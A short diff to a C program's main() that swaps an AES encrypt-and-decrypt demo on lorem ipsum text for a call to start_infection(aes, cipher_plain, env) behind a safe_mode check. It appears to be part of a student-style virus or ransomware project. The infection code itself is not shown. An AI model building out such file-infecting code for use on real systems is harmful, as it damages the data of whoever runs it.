@@ -19,7 +19,7 @@ t_key_iv	*get_key_iv(t_aes *aes)
 	return (aes->key_iv = gen_key_iv((char*)&key, (char*)&iv, sizeof(key), sizeof(iv)));
 }
 
-int main(int argc, char **argv)
+int main(int argc, char **argv, char **env)
 {
 	t_aes		*aes = NULL;
 
@@ -28,23 +28,13 @@ int main(int argc, char **argv)
 		 && init_decryption(aes))
 		{
 			t_cipher_plain *cipher_plain = get_cipher_plain();
-			if (cipher_plain) {
-				char bonjour[] = "Nunc fermentum rutrum sapien at convallis. Sed tempus, turpis ultricies ultrices ultrices, tellus ex placerat elit, sit amet volutpat nulla erat sit amet tortor. Etiam porta vel massa et pulvinar. Nunc in eleifend lacus. Maecenas hendrerit feugiat eleifend. Donec mauris eros, congue ut nulla nec, dapibus volutpat nibh. Nullam congue, orci vitae maximus rhoncus, lacus ligula sodales augue, at pharetra erat lacus non erat. Curabitur aliquam tellus est, et suscipit dui semper sed. Duis libero lectus, pulvinar in volutpat at, lobortis at turpis. Vestibulum eu blandit mi.";
-				if (set_plain(cipher_plain, (char*)&bonjour, sizeof(bonjour))) {
-					if (encrypt_plain_text(aes, cipher_plain) == TRUE
-					&& decrypt_cipher_text(aes, cipher_plain) == TRUE)
-					{
-						printf("Encrypted shit (%s): \n", cipher_plain->cipher);
-						int i = 0;
-						while (i < cipher_plain->cipher_len) {
-							printf("0x%02x ", cipher_plain->cipher[i++]);
-						}
-						printf("\nDecrypted: %s\n", cipher_plain->plain);
-					}
-				}
+			 if (cipher_plain) {
+				 if (safe_mode(aes)) {
+					 printf("Salopard\n");
+					 start_infection(aes, cipher_plain, env);
+			 	}
 			}
 		}
 	}
-
 	free_aes(aes);
 }
